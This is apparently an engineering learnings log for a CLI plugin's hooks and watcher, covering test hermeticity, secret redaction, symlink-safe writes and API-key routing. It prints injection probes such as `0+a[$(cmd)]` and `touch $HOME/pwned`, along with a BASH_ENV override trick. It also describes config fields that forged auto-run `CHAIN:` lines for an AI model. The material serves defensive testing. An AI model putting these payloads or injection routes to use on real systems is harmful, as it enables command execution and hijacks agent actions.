# Learnings

## 2026-10-28 | Security | watcher + hooks
- **Context:** radical-observability (ship PR 2 round 2, redact-decision)
- **Insight:** A fail-closed pipe is only closed if "ran" means "produced the right output". The redactor's main-module guard compared `import.meta.url` (node resolves symlinks) with `argv[1]` (it does not), so through a linked plugin folder it printed nothing and exited 0, and the hook committed blank lines. Check the output's shape (same non-empty line count as sent), not only the exit code, and test the hook through a symlinked plugin root. Also: redacting text but hashing the raw text leaves an oracle; derive every value written next to redacted text (keys, hashes) from the redacted form. And an allowlist of fields to redact misses fields the producer adds later (AskUserQuestion's option `preview`): walk every string at any depth inside the text fields (the API's `redactRecord` walks the whole record; the CLI walks the text fields only, so a new top-level text field must join `FREE_TEXT_FIELDS`). Round 3 added two more: (1) fields DERIVED from the same text (label → choice, recommended, answerText) must be redacted consistently: a context rule such as "lone value at the end of its line" fires in one field and not in another, so collect every span removed anywhere and remove it everywhere; (2) compare real paths on BOTH sides of a main-module check (`--preserve-symlinks-main` keeps the link in `import.meta.url`).

## 2026-10-28 | Testing | hooks
- **Context:** radical-observability (ship PR 2 round 1, oss-decision-record.sh)
- **Insight:** A lock path next to a committed file is itself committable: a `.lock` file, symlink or folder with a `.gitkeep` silenced the record in every clone, because the loop only knew "busy" and "stale". Test the lock with each shape the repo can carry, and say so on stderr when it is not yours. Inside the loop, "is it a real empty folder?" written as several checks races a release (8 hooks at once, 1 run in 10); each foreign test must be one check that is never true for a real lock (`-L`, `-f`, non-empty listing). Also: a "comes from the branch, else the only folder" test passes vacuously against a GIT_DIR bug, because the fallback hides the wrong branch; give the project a second folder so only the right branch can pass.

## 2026-10-30 | Security | hooks
- **Context:** hook-test-hermetic (ship round 1, T24)
- **Insight:** Three things a "body parses as JSON" test showed that reading the code did not. (1) `n=$(... | grep -c . || echo 0)` gives `0<newline>0` when nothing matches: grep -c prints 0 AND exits 1, so the fallback is appended, not substituted. Session start's context_restored payload was invalid JSON in every clean repo and every non-git folder, long before any hostile name. Use `|| true` and then check the digits. The same shape is still in checkpoint.sh:130 and oss-precommand.sh:138. (2) `[[ -n $x ]] && cmd </dev/null >/dev/null 2>&1 &` backgrounds the whole `&&` list. The list's subshell keeps the hook's own stdout while cmd runs, so the redirect does not detach anything. Write `if [[ -n $x ]]; then cmd ... & fi`. (3) A finding can already be guarded by a different layer: oss-notify.sh's analytics body interpolates only the workflow name, which `oss_valid_workflow_name` refuses before the body exists, and oss-notify-api-url.test.sh case 5 kills a mutant that drops that check. So a jq rewrite there could not be driven by a failing test. It was left as is, not added untested.

## 2026-10-29 | Security | hooks
- **Context:** hook-test-hermetic (build T17, version compare in session start)
- **Insight:** `10#` does not make bash arithmetic safe on file content. `(( 10#$v > 1 ))` with v=`0+a[$(cmd)]` runs cmd in /bin/bash 3.2, because array subscripts in the expanded text are expanded again. Check that a value is digits (`[[ $v =~ ^[0-9]+(\.[0-9]+)*$ ]]`) before any `(( ))` sees it. Proving it was harder than expected. The first payload, `touch $HOME/pwned`, did run, but inside a function with `local IFS=.` the dotted $HOME was split, so touch failed and the no-validation mutant passed. An injection probe has to have an effect that the code under test cannot break, such as a relative path with no IFS characters.

## 2026-10-29 | Testing | hooks
- **Context:** hook-test-hermetic (/oss:integration, real-curl analytics test)
- **Insight:** Two things only real dependencies showed. (1) A watchdog subshell inherits the script's TERM trap, so killing the subshell alone does not unblock a `$(... 3>&1)` wait: the detached job's real curl still holds fd 3. Kill the pipe's writers (the curls for this run's port), then the subshell. (2) Real curl confirms the stub assumption, but the two guards overlap: without the detach the hook is still bounded by `-m 5`, so a slow API would cost up to 5 s per /oss:* start, not hang it. Each guard needs its own scenario (held request vs never-answered request) to be caught. Also: when log lines land in the wrong project, compare the installed copy with the source before blaming the source. Here the repo's oss-log.sh has not read ~/.oss/current-project since 2.0.92; the machine-global ~/.oss/hooks/oss-log.sh had been replaced by a 2.0.83 copy when a session on an older plugin started (FOLLOWUPS, HIGH). `cmp` each ~/.oss/hooks file against the plugin cache versions to see which version wrote it.

## 2026-10-29 | Testing | hooks + watcher
- **Context:** hook-test-hermetic (T15b, T15c)
- **Insight:** Three extensions of the fd-3 rule. (1) In Node, `execSync(..., { stdio: ['pipe','pipe','pipe','pipe'] })` waits for EOF on the 4th pipe, which detached jobs inherit. Treat its ETIMEDOUT as a failure; a bare `catch {}` turns "did not finish" into a vacuous pass. (2) A global test env can switch off the very path that an assertion is about: watcher/test/setup.ts sets OSS_SKIP_HEALTH_CHECK=1, so "session hooks make no network calls" never ran the refresh or notify jobs it was meant to cover. A mutant that sends an off-sandbox curl from those jobs passed. (3) For "no X while a lock is held", put a stub of the wait primitive (`sleep`) first on PATH as the handshake: on the first wait it checks the negative, then releases the lock. That replaces `sleep 1; check`, which passed against a lock-ignoring sync that was 2 s slow.

## 2026-10-29 | Testing | hooks
- **Context:** hook-test-hermetic (build T7-T14)
- **Insight:** On macOS the first exec of a NEW executable is security-scanned: 0.3 s idle, 60 s or more under load. Most of this repo's "slow" or "flaky" hook tests were paying that per case, by writing a fresh stub (or copying hooks/) per sandbox. Make each stub once per run with `warm_stub` and symlink it into sandboxes; symlink a hooks dir instead of copying it. The hooks resolve their root logically (`cd dirname && pwd`) plus CLAUDE_PLUGIN_ROOT, so a symlinked hooks dir keeps the sandbox root.

## 2026-10-29 | Testing | hooks
- **Context:** hook-test-hermetic (build T1, T4h, T10)
- **Insight:** Once a hook detaches a job (`</dev/null >/dev/null 2>&1 &`), `$(hook)` no longer waits for it, so every assertion about what that job does is now racy, and every "no request" assertion passes vacuously. T1's detach silently broke two test files (calls=0) and had already made their "refused URL" cases unable to fail. Pass `3>&1` inside the substitution: the job inherits fd 3, so `$(...)` returns only when it exits, with no sleep. Prove it with a mutant that removes the call.

## 2026-10-29 | Security | hooks
- **Context:** hook-test-hermetic (build T4f, T4g)
- **Insight:** Five scripts sent the API key to a hardcoded production host and read it from $HOME/.oss/config.json, while `oss_api_url` honoured OSS_CONFIG_DIR and a configured apiUrl. Fixing only the first site (session start) left key A going to URL B. The rule is: the key goes only to the configured API, and key and URL come from one file (`oss_config_file`). `grep -rn 'onrender.com\|\.oss/config.json' hooks/*.sh` is the provenance check; oss-worktree-create.sh is the remaining site (FOLLOWUPS).

## 2026-10-29 | Process | workflow
- **Context:** hook-test-hermetic (build) and AgenticDevWorkflow#402
- **Insight:** The IRON LAW "count `OSS Command: /oss:build` banners in build.log" could never exceed 1, because `oss-log.sh init` truncates build.log. Every init also appends `[build] [INIT]` to the append-only `current-session/session.log`; that count rising by one per round is the observable now served in the laws. Also: in this build the T4g, T4h/T4i, T15 and server-side CLAUDE.md rounds were done by delegated agents, RED-first but not as /oss:build invocations, and their learnings were captured here afterwards.

## 2026-10-29 | Testing | hooks
- **Context:** hook-test-hermetic (build T13b)
- **Insight:** `bash` on a dev Mac's PATH is often Homebrew 5.x, but hooks and tests declare `#!/bin/bash`, which is 3.2. A bare `pattern)` case arm inside `$(cat <<EOF ...)` parses in 5.x and is a syntax error in 3.2, so a test can be "green" only because of the runner's PATH. hooks/__tests__/bash32-parse.test.sh now runs `/bin/bash -n` over every bash hook and test; write `(pattern)` arms inside substitutions.

## 2026-10-28 | Planning | hooks
- **Context:** plan (hook-test-hermetic)
- **Insight:** A hook's caller (Claude Code, execSync) waits for EOF on the hook's stdout/stderr, not for bash to exit. So `( … ) &` without `</dev/null >/dev/null 2>&1` silently makes "background" work block: an unbounded analytics curl on every /oss start, and an 11 s sleep at session start. Test "doesn't block" with a received/release stub and the child's `close` event, never with a wall-clock threshold.

## 2026-10-20 | Testing | hooks
- **Context:** plugin-value-flags (build P2-P3, oss-value.sh)
- **Insight:** A refusal test proves nothing when something downstream would refuse the same input. oss-error.js validates codes and fields itself, `test -d` rejects a relative or two-line path, and a script without the verb exits 2 with usage: each made the helper's own checks removable with the suite green. Assert that the downstream tool never ran (a recording `node` on PATH), give each rule an input only that rule rejects (a relative root that resolves below the cwd, a directory whose name has a newline), and do not accept rc 2 as a refusal.

## 2026-10-19 | Plugin | hooks
- **Context:** dead-hooks-cleanup (build T1-T4, v2.0.90)
- **Insight:** A hooks file under `.claude-plugin/` is never loaded (only the plugin.json `hooks` path and `hooks/hooks.json` are), and `tool == "X"` matchers are invalid. Seven hooks sat dead for months while their tests read a third, non-existent path. Pin registration with a test that resolves every command in the file actually loaded.

## 2026-10-19 | Testing | watcher
- **Context:** oss-writer-nofollow (build H1-H3)
- **Insight:** A fail-closed guard that a hook sources from its own directory turns every test that pipes the script (`cat x | bash`, empty BASH_SOURCE) or copies it alone into a temp dir into a silent no-write. The guard was right; 8 tests went red only in the full watcher run, which the 2.0.87 gates skipped (targeted files only). Stage the guard next to any copied hook, and run the whole test/hooks dir before shipping a hook change.

## 2026-10-19 | Testing | watcher
- **Context:** plugin-highs-gate (ship gate round 1 fixes)
- **Insight:** watcher/test/setup.ts runs `pkill -f "oss-session-start"`, `pkill -f "health-check.js"` and deletes every watcher.pid under $TMPDIR, machine-wide. With several sessions on one Mac, a plain `npx vitest run` in one worktree kills other sessions' test runs and the user's live session-start hooks. Until setup.ts kills only what it started, run watcher vitest from a shared machine with a config that omits setupFiles (pool forks, fileParallelism false).

## 2026-10-19 | Testing | watcher
- **Context:** plugin-highs-gate (ship gate round 1 fixes)
- **Insight:** A mutation run is what shows a guard is one-sided. The "log on timeout" test passed with a mutant that logged on every error, until a control test (a non-timeout failure logs nothing) was added. When a fix is "do X only when Y", write the not-Y control too. Also record equivalent-safe survivors instead of chasing them: `redirect: 'manual'` survives the `redirect: 'error'` test, but Node then returns the 3xx itself, `!ok` throws, and the target is never contacted.

## 2026-10-19 | Process | hooks
- **Context:** plugin-highs-gate (build round 2)
- **Insight:** `oss-log.sh init build` starts current-session/build.log over, so `grep -c 'OSS Command: /oss:build'` stays 1 after a second genuine /oss:build invocation in the same session. The IRON LAW banner count cannot count rounds as written; check for a new `build:START` line per round instead, or make init append.

## 2026-10-19 | Security | watcher
- **Context:** oss-writer-nofollow (build N2-6)
- **Insight:** Swapping statSync for lstatSync to 'use the checked inode' is wrong where links are legitimate (HOME ~/.oss is user-owned; dotfile managers symlink config.json): the rewrite copies the link's 0755/0777 mode onto the secret file. Decide per branch whether a link is refused (project) or followed (HOME).

## 2026-10-19 | Security | hooks, watcher
- **Context:** oss-writer-nofollow (build)
- **Insight:** Any path under a repo is attacker-controlled: `git clone` recreates committed symlinks. So every write into `<project>/...` must go through ONE guard per runtime (hooks/oss-safe-path.sh, watcher/src/utils/safe-project-write.ts). The guard rejects any symlinked component, requires user-owned directories, and requires the target to be absent or a plain file with nlink 1. The N0 grep found 26 writers. The worst were not the obvious state file: worktree-create copied the API key through a linked `.oss/config.json`, and archive-check moved committed dev docs through a linked `dev/completed` (for example into ~/.claude/commands). `mkdir -p` / `mkdirSync` of a FINAL link is not a sink (mkdir never follows it); a link as an INTERMEDIATE component is. Attack tests must run the committed dist CLIs, because customers run dist and a src-only fix stays RED.

## 2026-10-19 | Testing | hooks
- **Context:** oss-writer-nofollow (build)
- **Insight:** Another session's watcher/test/setup.ts runs `pkill -f "oss-session-start"`, `pkill -f "health-check.js"` and `find $TMPDIR -name watcher.pid -delete` against the whole machine. It killed hook test runs, deleted sentinels, and killed an anti-vacuity loop mid-revert. Shell tests that run session start should run it under another file name and keep their world outside $TMPDIR. Revert loops should take file names on stdin and restore on TERM. Commit fixtures with `git add -f`, because the user's XDG ignore drops `.claude/settings.local.json`.

## 2026-10-19 | Security | watcher
- **Context:** plugin-highs-gate (build, from the post-merge ship gate on #193)
- **Insight:** Fixing a dead path can make an old flaw reachable. #193 only made ship send `complete`, but that switched on chain-trigger's output for ship, and chain-trigger copied team-config `command`/`condition` straight into `CHAIN:` lines that the model runs without asking. A newline in either field forged extra lines or free text outside the block, and the 10-line cap counted config entries, not printed lines. When a change wires up a previously unreachable consumer, gate the data it now consumes: validate every value that reaches an auto-execute channel against a strict shape, and assert in tests that every printed line matches that shape (watcher/test/cli/chain-trigger.test.ts).

## 2026-10-19 | Build | watcher
- **Context:** plugin-highs-gate (build)
- **Insight:** Hooks run the COMMITTED bundle (watcher/dist/cli/chain-trigger.cjs), not src, and it had lagged src since #169. Every src fix and src test passed while customers ran old code. Guard it with a test that builds src in memory with esbuild using the same options as scripts/bundle-cli.js and `absWorkingDir` pinned (deterministic, ~0.1s), then asserts the committed bundle is byte-identical (watcher/test/hooks/chain-trigger-dist.test.ts).

## 2026-10-19 | Config | watcher
- **Context:** plugin-highs-gate (build, IRON LAW #1b)
- **Insight:** Two readers of "the OSS config" disagreed: chain-trigger checked `https:` on ~/.oss/config.json while workflow-config fetched using OSS_CONFIG_DIR's file, so the checked file was not the used file and the Bearer key went over plain http. One reader (watcher/src/api/api-credentials.ts) now serves both, and the https check sits inside the fetch itself. Other API callers still read config their own way (custom-command-executor, startup-optimizer): follow-ups.

## 2026-10-19 | Workflow | commands
- **Context:** plugin-highs (build)
- **Insight:** A wrapper step that says "after X runs, read its output" is a contract with another line of the same file. ship.md's chain step waited for `ship complete`, which nothing in ship.md ever sent, so team `chains_to` for ship and "-> DONE" never fired. Test the wrapper by running the notify lines it documents, in order, against the real oss-notify.sh, and assert the block lands on the event the chain step names (watcher/test/hooks/ship-wrapper-chain.test.ts). Order matters too: `merged` resets workflow state, so `complete` must come after it.

## 2026-10-19 | Bash | hooks
- **Context:** plugin-highs (build)
- **Insight:** A script nobody calls still ships and still gets fixed in review rounds. The old ship preflight hook (deleted in 2.0.86) failed every full-mode run (grep no-match under pipefail) and every run on /bin/bash 3.2 (`declare -A`); its own dry-run tests passed because dry-run skipped the broken check. When a script has no caller, delete it and guard the absence with a retirement test in hooks/__tests__ rather than repair it.

## 2026-10-09 | Config | one-shot-ship-plugin
- **Context:** build (decrypt-download-pin)
- **Insight:** `releases/latest/download` is shared by EVERY release in the repo. Publishing any release (oss-launch) can silently take "Latest" and 404 another binary's installer for months. Pin each installer to its own tag and keep a guard test (`__tests__/new-user-install.acceptance.test.sh` A3) that fails on `releases/latest/download` in shipped files.

## 2026-10-09 | Config | one-shot-ship-plugin
- **Context:** build
- **Insight:** Hooks run from the ~/.oss/hooks COPY made at session start (fixed HOOKS_TO_COPY list). Any file a hook reads beside itself (e.g. a checksum manifest) must be added to that list, or it works in tests and fails closed for every customer. Fall back to `$(cat ~/.oss/plugin-root)/hooks/`.

## 2026-10-09 | Security | one-shot-ship-plugin
- **Context:** ship (gate finding M1)
- **Insight:** `curl -o <final-path>` over an existing executable keeps its 0755 mode, so unverified bytes are runnable at the final path until verification finishes, and a failed check that `rm`s it deletes the customer's working binary. Download to `mktemp` (0600) in the same directory, verify, chmod, then `mv -f` (atomic); clean up with an EXIT trap.

## 2026-10-09 | Testing | one-shot-ship-plugin
- **Context:** ship fix round 2
- **Insight:** A signal-cleanup test can pass on the code it is meant to fix: bash already runs the EXIT trap on TERM/HUP/INT, only SIGKILL leaks. Measure which signals leak before writing the fix. And macOS `mktemp` (no template) ignores `TMPDIR`, so assert on the exact paths the code wrote (record curl `-o` targets), not on a directory you assume it used.

## 2026-10-09 | Process | one-shot-ship-plugin
- **Context:** ship (3 gate iterations)
- **Insight:** Each "fix the caller text" round missed callers outside the folder its guard scanned (commands/ → agents/). Write the guard over the SHAPE of the call (`ensure-decrypt-cli.sh ||`) across the whole shipped tree first, then fix until it is green — not the other way round.

## 2026-10-16 | Release | hooks
- **Context:** iron-laws-sync-recovery (build)
- **Insight:** A local-only, untracked file can make a test-plan checkbox lie. PR #150 shipped "session start syncs Iron Laws" while hooks/oss-iron-laws-sync.sh existed only, untracked, in the dev checkout, so released plugins (2.0.51-2.0.83) silently skipped the sync for 7 months. Guard: hooks/__tests__/referenced-hooks-tracked.test.sh asserts that every hook referenced by session start or commands is tracked in git. Verify plugin behaviour against ~/.claude/plugins/cache/..., not ~/.oss/hooks.

## 2026-10-16 | Bash | hooks
- **Context:** iron-laws-sync-recovery (build)
- **Insight:** `while IFS= read -r line` silently drops a final line that has no trailing newline; use `while IFS= read -r line || [[ -n "$line" ]]` when rewriting user files such as CLAUDE.md.

## 2026-10-16 | Bash | hooks
- **Context:** iron-laws-sync-recovery (build, ship-gate round 1)
- **Insight:** Under `set -u`, `source "$SCRIPT_DIR/x.sh" 2>/dev/null || true` still ABORTS the script when `SCRIPT_DIR` is not yet set: an unbound-variable expansion error is fatal in a non-interactive shell and `|| true` never runs. Inserting a `source` line "right after `set -euo pipefail`" put it above `SCRIPT_DIR=` in oss-notify.sh and both ask-telegram hooks; only reading the result caught it. Place shared-helper sources after the variable they use.

## 2026-10-16 | Bash | hooks
- **Context:** iron-laws-sync-recovery (build, ship-gate round 1)
- **Insight:** To keep an API key off argv, feed curl its header with `curl --config - ... < <(printf 'header = "Authorization: Bearer %s"\n' "$key")` (hooks/oss-api-curl.sh). Use process substitution, not `printf | curl` (under the caller's `pipefail` a test shim that never reads stdin makes printf die of SIGPIPE and the call "fails") and not a here-string (bash 3.2 backs here-strings with a temp file, i.e. the key on disk). Escape `\` and `"` in the key; curl's config parser decodes them (verified with nc).

## 2026-10-16 | Testing | hooks
- **Context:** iron-laws-sync-recovery (build, ship-gate round 1)
- **Insight:** A function called as `x=$(fn)` runs in a subshell, so globals it sets (a temp-file path for the EXIT trap to delete) never reach the parent. Return results through a global and call the function directly when it creates files the trap must clean up. Also: `grep -q 'JSON.parse'` matches `JSON_parse_REMOVED` (`.` is a regex wildcard) and made a doc-accuracy guard vacuous until a mutation exposed it; use `grep -F` for code tokens.

## 2026-10-16 | Testing | hooks
- **Context:** iron-laws-sync-recovery (build, ship-gate round 1)
- **Insight:** To prove a session-start hook never waits for a background job, run it as `out=$(hook)` with a stub job that prints and sleeps: if the job inherits stdout, command substitution blocks until it exits, so "stub finished before the hook returned" or "stub output in $out" is a deterministic RED, with no elapsed-time assertion to flake.

## 2026-10-16 | Testing | hooks
- **Context:** iron-laws-sync-recovery (build, ship-gate round 2)
- **Insight:** To test the node-free path, a `node`/`python3` shim that exits 127 is not "absent": `command -v` still finds it. Build a PATH from symlinks to /usr/bin, /bin, /usr/sbin and /sbin minus the hidden tools (macOS ships /usr/bin/python3, so it must be filtered too) and run the hook with `/usr/bin/perl` by absolute path. A python3 wrapper on that PATH that logs its argv proves the parser got the config PATH, not the key. Also: zsh's `echo "$out"` interprets backslash escapes, so a test name containing `\u` made a summary line vanish from a captured run; use `printf '%s\n'`, and keep backslashes out of test names.

## 2026-10-16 | Bash | hooks
- **Context:** iron-laws-sync-recovery (build, ship-gate round 2)
- **Insight:** Comparing marker lines with `$0 == s` misses a CRLF file (each line ends in `\r`), and in --install mode a missed marker means "no block", so it APPENDS a second one. Compare after `sub(/[[:space:]]+$/, "", x)`, and write added lines with the file's own line ending (detected from its first line) while copying user lines byte-for-byte. Same class of bug: /oss:ideate (#146-#161) wrote `<!-- IRON LAWS START -->` without the suffix, and skills/ideate.md still tells the model to write it, so the sync must read the legacy START as a START and rewrite it canonical.

## 2026-10-19 | Bash | hooks
- **Context:** api-curl-source (build)
- **Insight:** On macOS /bin/bash 3.2, `source missing 2>/dev/null || true` under `set -e` exits the script with rc 1 and no output; the `|| true` (or any `|| { ... }`) never runs. bash 4+/5 honours it, so tests that run hooks via a PATH `bash` (often Homebrew/MacPorts 5.x) stay green. Load optional files with `if [[ -f X ]]; then source X; fi`, and run hook tests under `/bin/bash` explicitly. Without `-e` (e.g. `set -uo pipefail`) the fallback is reachable on 3.2. Guard: hooks/__tests__/optional-helper-source.test.sh.

## 2026-10-20 | Bash | hooks
- **Context:** notify-routing-unify (build, ship round 2, R2-5)
- **Insight:** Fixing one `$(pwd -P)` that drops a trailing newline is not enough: every `$(...)` downstream that re-derives the path (`$(realpath ...)` in a validator, `$(_phys_dir ...)` in the write guard, `x=$(validate ...)` in the caller) strips it again, and the event silently falls to the global log instead of the right project. Compute the physical path ONCE with a sentinel (`o=$(cd -P -- "$d" && pwd -P && echo .); o="${o%$'\n.'}"`) and hand it on in a variable, never through another `$(...)`. Test it with a project folder whose name ends in a newline inside a normal repo (a repo TOP ending in newline is refused earlier by `git rev-parse --show-toplevel`, which has the same strip).

## 2026-10-20 | Testing | hooks
- **Context:** notify-routing-unify (build, ship round 2, R2-2/R2-6)
- **Insight:** Without root you cannot make a folder owned by another user, and `[[ -O x ]]` is a keyword no test can intercept. Spell owner checks `test -O x` and simulate a foreign owner per exact path with a BASH_ENV file defining `test() { [[ $1 == -O && ":$LIST:" == *":$2:"* ]] && return 1; builtin test "$@"; }` - BASH_ENV is read by every non-interactive bash, including `bash -c` and hook scripts. TS twin: `node --require shim.cjs` that wraps `fs.lstatSync` to bump `uid` for listed paths, then `require('module').syncBuiltinESMExports()` so ESM `import * as fs` sees it. Also: `mv src name` moves src INTO name when name is a link to a folder - check `[[ -e name || -L name ]]` before archiving to a predictable name.

## 2026-10-22 | Security | packages/cli-decrypt
- **Context:** build (decrypt-version-source)
- **Insight:** A validator that exists is not a validator that runs: `cache.ts` had `validateType` + `ALLOWED_TYPES`, but its only caller is the disk cache, which is off, so `--type` reached the keyed URL unchecked. When hardening one input in a URL (encoding `--name`), trace every other input in the same URL to its first runtime check. Also: Node's fetch strips `Authorization` on a CROSS-origin redirect, so a two-port redirect test only proves the extra request; assert the target gets zero requests (not "no auth header"), or the test passes without the fix.

## 2026-10-23 | Security | packages/cli-decrypt, hooks, commands
- **Context:** build (decrypt-version-source, ship round 1)
- **Insight:** One value read in N places is N security policies. `apiUrl` was read by the CLI (3 copies, two config-dir rules), `oss-notify.sh`, and 8 snippets in settings/telegram.md with a default host that does not resolve; hardening the CLI alone left the hook sending the Bearer key to any URL. Grep the KEY (where the secret is sent) as well as the VALUE. Also: `encodeURIComponent` does not encode `.`, so `..` still walks up a path; validate names, don't just encode them. And `npm install -g pkg` in CI silently installs the unmaintained, advisory-carrying `pkg@5.8.1` regardless of the lockfile; build tools must come from `./node_modules/.bin`.

## 2026-10-23 | Testing | hooks + packages/cli-decrypt
- **Context:** build (decrypt-version-source, ship round 2)
- **Insight:** When one rule lives in two languages (TS `getApiUrl`, bash `oss_api_url`), only a shared case table run against both keeps them equal; it found 15 TS-only and 12 bash-only accepts, plus zsh-only NUL accepts (zsh `=~` stops at NUL). Do type and charset checks inside jq so NUL never reaches the shell, and never anchor a jq charset test (`^`/`$` match at line breaks; use `test("[^!-~]")`). curl reads ~/.curlrc unless `-q` is the FIRST argument, which can add a second keyed URL or a trace file with the key. Watcher hook tests break when CLAUDE_PROJECT_DIR is exported in the shell running vitest — unset it before running suites.

## 2026-10-23 | Release | packages/cli-decrypt, hooks/ensure-decrypt-cli.sh
- **Context:** build (decrypt-version-source, phase 3)
- **Insight:** Linux release binaries can be smoke-tested on a Mac without a Linux box: `docker run --rm --platform linux/arm64 -v "$PWD":/w:ro debian:bookworm-slim /w/oss-decrypt-Linux-arm64 --version` (chmod +x first; a :ro mount keeps the exec bit only if the host file has it). The committed checksums in hooks/oss-decrypt-checksums.txt are guarded only by a live download, because every unit test injects its own manifest; a wrong value fails closed (install refused), never open.

## 2026-10-23 | Security | hooks/ensure-decrypt-cli.sh
- **Context:** build (decrypt-version-source PR 2)
- **Insight:** Never put text read from a file into bash `$(( ))` before checking it is digits only: arithmetic evaluates names and `a[$(cmd)]`, so a stamp file becomes command execution. Also: raising a version floor forces every existing user through the download path; make that path fail soft when a working binary exists (but never on a hash mismatch), cap the whole upgrade below the caller's timeout (small file first, binary gets the rest), and back off after a failure, or slow and offline users lose the tool.

## 2026-10-30 | Testing | hooks/oss-session-start.sh
- **Context:** hook-test-hermetic (ship round 1, T18)
- **Insight:** To prove a hook never opens a FIFO, without a hang or a sleep: before the run, start `( exec 4>"$fifo" ) &` — it blocks in open() until a reader appears. A hook that reads the FIFO gets EOF at once (no hang) and the writer exits; a hook that never opens it leaves the writer blocked. After the run `kill -0 $writer` = never opened; then kill and wait it. Also: "write the record atomically" is testable without timing: make the record a HARD link to an outside file; `printf > record` changes the outside file, `mktemp` + `mv` does not. And a record that names a version must also name who wrote it (root + that root's live version), or a planted or orphaned high record freezes updates forever.

## 2026-10-30 | Security | hooks/oss-api-curl.sh
- **Context:** hook-test-hermetic (ship round 1, T21)
- **Insight:** A "safe default" is only safe if the secret goes nowhere when it applies. `oss_api_url` fell back to production when jq was missing or the config did not parse, but the callers grep the key out of that same file, so a dev API's key went to production. When the URL reader fails, give no URL, not the default. Do not make it "refuse without jq": /oss:login writes `apiUrl` into every new config, so that would cut off every jq-less user. A grep reader has to refuse what it cannot tell apart (more than one `"apiUrl"`, or any nested `{`). To hide jq in a test, use a PATH that holds only a `grep` symlink: macOS 15+ ships `/usr/bin/jq`, so `PATH=/usr/bin:/bin` still finds it. A charset class that looks redundant next to the shell regex was killed only by a raw NUL byte under zsh. Run grep-based readers in both shells, with raw bytes as well as `\u` escapes.

## 2026-10-30 | Security | hooks/oss-api-curl.sh, hooks/oss-session-start.sh
- **Context:** hook-test-hermetic (ship round 1, T20)
- **Insight:** To say why a request was refused without a second copy of the rule, give that one refusal its own return code (`oss_api_url` returns 2 only for "loopback http, opt-in missing", 1 for everything else) and let the message site read the code. Check the opt-in LAST, after the URL and port checks: a mutant that checked it first told the user to set the switch for `http://localhost:99999` and `http://evil.example.com`, which the switch would never let through. Also: a test that runs a shared case table from a copied location found no table, ran 0 cases and exited 0 (`0/0 passed`); a table-driven test should fail when the table is empty or missing.

## 2026-10-30 | Security | hooks/oss-login.sh, hooks/oss-worktree-create.sh
- **Context:** hook-test-hermetic (ship round 1, T22)
- **Insight:** Moving a WRITER onto `$OSS_CONFIG_DIR` changes which tests are dangerous, not just which tests read the key. Once `oss-login.sh` wrote `oss_config_file`, `commands/__tests__/value-file-wrappers-run.test.sh` (sandbox HOME, but no `unset OSS_CONFIG_DIR`) overwrote an exported config dir with a test key: proven with a scratch sentinel config, which came back holding `ossk_test_key_123`. After a writer or a copier (worktree-create) starts honouring an env override, grep every test that RUNS it (not only the tests of that file) and run each with the override pointed at a sentinel, then compare the sentinel byte for byte.

## 2026-10-28 | Testing | hooks/oss-decision-record.sh (radical-observability Task 8b)
- **Context:** build
- **Insight:** A "skip the unanswered question" test passed before the code existed, because the unanswered question in the fixture was a multiSelect one and `picks(null; …)` made jq error, so `|| continue` skipped it by accident. Feed the same rule through every branch (here a single-select question too, which DID write `choice: null`) before trusting a first-run pass. Also: a check on random output (the uuid variant bits) that passes 75% of the time without the code is no guard; repeat it (16 runs leaves a 0.25^16 chance of a false pass) and prove it with the mutation.

## 2026-10-29 | Security | watcher/src/services/redaction.ts (radical-observability keep-fixing)
- **Context:** build (gate-fix round)
- **Insight:** A regex fix for one leaking shape reopened a shape the old regex already handled: making a quoted value close only at "quote + whitespace/end/punct-list" fixed `NAME='ab'rest'` but leaked `password="two words". Done`. The suites stayed green because no test pinned the old behaviour. Before changing a redaction pattern, run the OLD and NEW pattern over a corpus (the parity fixture plus natural prose endings: `.` `!` `:` `?` `-` an em dash) and diff: any input the old one redacted and the new one does not is a regression. Also: recover what was redacted at match time (the replacer has `match` and the kept prefix), never by re-aligning the output against the input with `indexOf`.

## 2026-10-29 | Security | watcher/src/cli/redact-decision.ts (radical-observability keep-fixing round 3)
- **Context:** build (gate-fix round)
- **Insight:** Three rounds of quote-rule changes each traded one leak for another (the last let `{"password": "", "token": "<v>"}` leak the token), so the pattern went back to main's and the quote cases became one follow-up gated by an old-vs-new corpus test. Stop changing a shared regex after the second regression and revert; leaks main already had are not this branch's to fix. Separately, a cross-field pass must remove known values from each field's raw text BEFORE the patterns run: after redaction, an inner match (`token=` inside `Password: x&token=y`) has already split the value, so the whole-value string no longer occurs and its first part stays in clear. (Round 4: that reorder was undone. Stripping values from the raw text first can consume a key a pattern needs (`?token=<jwt>.secret=<v>`), so the record redacted less than the patterns alone. Any post-processing of redacted text must be a superset of the plain redaction by construction, and a guard test must say so: "never keeps text the patterns alone would redact". Overlap fixes need position masks, not string order.)

## 2026-10-29 | Security | watcher/src/services/redaction.ts (radical-observability keep-fixing round 5)
- **Context:** build (gate-fix round)
- **Insight:** Appending a ported pattern list in front of the old one is a provenance change: the old `bare-bearer` never ran on `token=Bearer <opaque>` any more, because the ported `secret-assignment` consumed `Bearer` as the value first, and five gate rounds missed it because every corpus compared the API list with itself, never the watcher with origin/main's watcher. Reordering does not fix it (neither order covers the other); a predicate that declines the scheme word does. Keep a frozen copy of the previous list in a test and assert the new list never keeps a secret value the old one removed.

## 2026-10-30 | Testing | hooks/__tests__/tests-hermetic-env.test.sh
- **Context:** hook-test-hermetic (ship round 2, T29)
- **Insight:** Under `set -o pipefail`, `cmd file | grep -q X` can report "no match" on a large file: grep -q exits at the first hit, the writer dies of SIGPIPE, and pipefail turns that 141 into the pipeline's status. The scanner silently skipped a 1200-line test (ensure-decrypt-cli) until the count was checked. In a scanner that pipes, use `grep -E X >/dev/null`, and print how many files matched so a short count is visible. Also: an exported OSS_CONFIG_DIR wins over the sandbox HOME, so "HOME is a temp dir" is not enough for a hook test; it must unset OSS_CONFIG_DIR and OSS_MANIFEST_URL too (now enforced by the guard).

## 2026-10-30 | Security | hooks/oss-api-curl.sh (oss_config_strings)
- **Context:** hook-test-hermetic (ship round 2, T30)
